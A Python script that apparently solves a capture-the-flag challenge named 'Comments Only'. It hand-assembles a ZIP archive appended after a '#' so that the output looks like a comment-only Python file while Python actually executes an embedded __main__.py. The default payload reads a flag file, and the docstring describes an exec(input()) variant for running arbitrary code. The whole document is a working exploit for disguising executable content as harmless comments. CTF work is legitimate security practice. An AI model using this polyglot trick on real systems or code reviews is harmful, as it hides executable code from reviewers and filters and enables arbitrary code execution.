#!/usr/bin/env python3
"""
Create a Python/ZIP polyglot file for the "Comments Only" challenge.

This script creates a file that:
1. Looks like a normal Python script when viewed
2. Is actually a ZIP file containing __main__.py with exec(input())
3. Contains no newline (0x0a) or carriage return (0x0d) bytes
4. When run with Python, executes arbitrary code from input
"""

import struct


def create_polyglot(
    output_filename="solution.py",
    prefix_code="",
    payload_code="print(open('/home/ctfuser/flag').read())",
):
    """
    Create a Python/ZIP polyglot file.

    Args:
        output_filename: Name of the output file
        prefix_code: Python code that appears before the comment
        payload_code: Python code that gets executed from the ZIP
    """

    # The Python prefix - ends with # to comment out the ZIP data
    prefix = prefix_code.encode() + b"#"

    # File content for __main__.py (no newline at end)
    content = payload_code.encode()

    # Pad content to avoid 0x0a (10) or 0x0d (13) in length fields
    while len(content) in [10, 13]:
        content += b" "  # Add space padding

    # Build ZIP file structure manually to avoid newlines

    # Local file header
    local_header = b"PK\x03\x04"  # Local file header signature
    local_header += b"\x00\x00"  # Version needed to extract
    local_header += b"\x00\x00"  # General purpose bit flag
    local_header += b"\x00\x00"  # Compression method (0 = stored)
    local_header += b"\x00\x00\x00\x00"  # Last mod time and date
    local_header += b"\x00\x00\x00\x00"  # CRC-32 (0 for simplicity)
    local_header += struct.pack("<I", len(content))  # Compressed size
    local_header += struct.pack("<I", len(content))  # Uncompressed size
    local_header += struct.pack("<H", 11)  # Filename length
    local_header += b"\x00\x00"  # Extra field length
    local_header += b"__main__.py"  # Filename
    local_header += content  # File data

    # Calculate offset for central directory
    cd_offset = len(prefix) + len(local_header)

    # Central directory file header
    central_dir = b"PK\x01\x02"  # Central file header signature
    central_dir += b"\x00\x00"  # Version made by
    central_dir += b"\x00\x00"  # Version needed to extract
    central_dir += b"\x00\x00"  # General purpose bit flag
    central_dir += b"\x00\x00"  # Compression method
    central_dir += b"\x00\x00\x00\x00"  # Last mod time and date
    central_dir += b"\x00\x00\x00\x00"  # CRC-32
    central_dir += struct.pack("<I", len(content))  # Compressed size
    central_dir += struct.pack("<I", len(content))  # Uncompressed size
    central_dir += struct.pack("<H", 11)  # Filename length
    central_dir += b"\x00\x00"  # Extra field length
    central_dir += b"\x00\x00"  # File comment length
    central_dir += b"\x00\x00"  # Disk number start
    central_dir += b"\x00\x00"  # Internal file attributes
    central_dir += b"\x00\x00\x00\x00"  # External file attributes
    central_dir += struct.pack("<I", len(prefix))  # Relative offset of local header
    central_dir += b"__main__.py"  # Filename

    # End of central directory record
    cd_size = len(central_dir)
    end_cd = b"PK\x05\x06"  # End of central dir signature
    end_cd += b"\x00\x00"  # Number of this disk
    end_cd += b"\x00\x00"  # Disk where central directory starts
    end_cd += b"\x01\x00"  # Number of central directory records on this disk
    end_cd += b"\x01\x00"  # Total number of central directory records
    end_cd += struct.pack("<I", cd_size)  # Size of central directory
    end_cd += struct.pack("<I", cd_offset)  # Offset of start of central directory
    end_cd += b"\x00\x00"  # ZIP file comment length

    # Combine all parts
    polyglot = prefix + local_header + central_dir + end_cd

    # Write to file
    with open(output_filename, "wb") as f:
        f.write(polyglot)

    print(f"Created {output_filename}")
    print(f"File size: {len(polyglot)} bytes")
    print(f"When run with Python, it will execute: {payload_code}")

    # Verify no newlines or carriage returns
    if b"\x0a" in polyglot or b"\x0d" in polyglot:
        print("WARNING: File contains 0x0a or 0x0d bytes!")
        # Show where they appear
        for i, byte in enumerate(polyglot):
            if byte in [0x0A, 0x0D]:
                print(f"  Found 0x{byte:02x} at offset {i} (0x{i:02x})")
    else:
        print("✓ No 0x0a or 0x0d bytes found in the file")


if __name__ == "__main__":
    # Create the polyglot file
    create_polyglot()

    # Show hex dump of first few lines
    print("\nFirst 160 bytes in hex:")
    with open("solution.py", "rb") as f:
        data = f.read(160)
        for i in range(0, len(data), 16):
            hex_str = " ".join(f"{b:02x}" for b in data[i : i + 16])
            ascii_str = "".join(
                chr(b) if 32 <= b < 127 else "." for b in data[i : i + 16]
            )
            print(f"{i:08x}: {hex_str:<48} {ascii_str}")
